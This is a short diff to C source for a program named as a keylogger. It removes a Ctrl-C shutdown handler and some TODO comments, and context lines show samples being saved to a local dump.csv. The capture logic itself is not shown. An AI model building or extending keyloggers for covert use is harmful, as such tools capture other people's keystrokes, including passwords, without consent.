@@ -1,13 +1,5 @@
 #include "keylogger.h"
 
-void intHandler(int dummy) {
-    printf("Killed [%d]\n", dummy);
-    fflush(stdout);
-    saveToFile();
-    exit(dummy);
-}
-// TODO: add filename argument
-// TODO: pass data as Sample*
 void saveToFile(int sampleCount, sample * loggedSamples) {
     FILE * dump = fopen("./dump.csv", "w");
     for (int i = 0 ; i < sampleCount; i++) {
@@ -174,9 +166,6 @@ void keylogSession() {
 } // End of keylogSession() function
 
 int main() {
-    // Registring shutdown hook for C^C shutdown command-line.
-    signal(SIGINT, intHandler);
-
     printf("Keylogger started\n");
     keylogSession();
 
